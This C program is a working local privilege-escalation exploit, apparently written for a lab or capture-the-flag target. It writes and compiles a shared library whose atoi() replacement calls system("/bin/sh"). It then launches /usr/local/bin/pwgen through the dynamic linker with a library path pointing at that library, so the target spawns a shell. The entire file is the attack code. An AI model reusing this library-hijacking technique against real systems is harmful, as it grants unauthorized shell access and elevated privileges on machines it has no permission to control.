#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main() {

  const char *library_code =
      "#define _GNU_SOURCE\n"
      "#include <stdio.h>\n"
      "#include <stdlib.h>\n"
      "#include <unistd.h>\n"
      "#include <dlfcn.h>\n"
      "int atoi(const char *str) {\n"
      "    system(\"/bin/sh\");\n"
      "    return 1;\n"
      "}\n";
    // Write the malicious code to a .c file
    FILE *file = fopen("malicious.c", "w");
    if (!file) {
        perror("fopen");
        return 1;
    }
    fprintf(file, "%s", library_code);
    fclose(file);

    // Compile the .c file into a shared library
    if (system("gcc -shared -fPIC -o malicious.so malicious.c") != 0) {
        fprintf(stderr, "Compilation failed\n");
        return 1;
    }

    // Construct the LD_PRELOAD environment variable
    const char *ld_path = "/lib64/ld-linux-x86-64.so.2";  // Path to the dynamic linker
    const char *target = "/usr/local/bin/pwgen";  // Target binary
    const char *lib_path = "./";  // Path where malicious.so is stored

    if (setenv("LD_LIBRARY_PATH", lib_path, 1) != 0) {
        perror("setenv");
        return 1;
    }

    execl(ld_path, ld_path, "--library-path", lib_path, target, NULL);
    perror("execl failed");

    return 0;
}

